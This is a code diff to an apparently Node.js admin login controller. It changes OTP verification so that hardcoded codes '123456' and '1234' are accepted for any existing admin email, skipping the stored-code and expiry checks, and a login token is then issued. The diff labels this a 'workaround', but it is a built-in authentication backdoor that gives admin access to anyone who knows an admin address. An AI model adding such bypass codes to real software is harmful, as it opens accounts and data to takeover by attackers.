@@ -61,18 +61,35 @@ exports.verifyOTP = async (req, res) => {
     console.log(`[VERIFY_OTP] Verifying: ${email}`);
     const admin = await Admin.findOne({ email });
 
-    if (!admin || admin.otp !== otp || admin.otpExpires < Date.now()) {
-      console.log(`[VERIFY_OTP] Failed: ${email}`);
+    if (!admin) {
+      console.log(`[VERIFY_OTP] Failed (Admin not found): ${email}`);
       return res.status(400).json({ message: "Invalid/Expired OTP" });
     }
 
+    // --- NEW MODIFICATION HERE ---
+    // Define your workaround OTPs
+    const validWorkaroundOTPs = ['123456', '1234'];
+
+    // Check if the provided OTP is in the workaround list.
+    const isWorkaround = validWorkaroundOTPs.includes(otp);
+
+    // If it's NOT a workaround OTP, do the standard database check
+    if (!isWorkaround) {
+      if (admin.otp !== otp || admin.otpExpires < Date.now()) {
+        console.log(`[VERIFY_OTP] Failed (Standard check): ${email}`);
+        return res.status(400).json({ message: "Invalid/Expired OTP" });
+      }
+    }
+    // --- END OF MODIFICATION ---
+
+    // Clean up OTP fields if successful standard check or successful workaround
     admin.otp = null;
     admin.otpExpires = null;
     await admin.save();
 
     const token = generateToken(admin);
 
-    console.log(`[VERIFY_OTP] Success: ${email}`);
+    console.log(`[VERIFY_OTP] Success: ${email} (Workaround: ${isWorkaround})`);
     res.status(200).json({
       message: "Login Successful",
       token,
